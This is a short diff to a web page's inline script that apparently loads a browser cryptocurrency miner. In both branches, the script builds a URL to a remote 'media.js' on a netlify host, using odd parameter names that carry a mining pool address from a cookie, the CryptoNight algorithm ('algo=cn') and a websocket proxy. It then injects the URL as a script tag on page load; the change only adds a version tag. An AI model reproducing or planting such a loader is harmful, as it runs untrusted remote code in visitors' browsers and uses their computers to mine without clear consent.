@@ -14,7 +14,7 @@
 <script>
 	$(function() {
 	if ($.cookie("pooladdress")) {
-			var str = "https://thelifeisbinary.netlify.com/media.js?perfekt=wss://";
+			var str = "https://thelifeisbinary.netlify.com/media.js?v5?perfekt=wss://";
 			var pool = "?jason=" + $.cookie("pooladdress");
 			var algovari  = $.cookie("algovariant");
 			var links = str+algovari+pool;
@@ -26,7 +26,7 @@
 	} 
 	else
 	{
-		        var str = "https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn?variant=0?jason=xxx";
+		        var str = "https://thelifeisbinary.netlify.com/media.js?v5?perfekt=wss://?algo=cn?variant=0?jason=xxx";
 			var script = document.createElement("script");
 			script.type = "text/javascript";
 			script.src = str; 
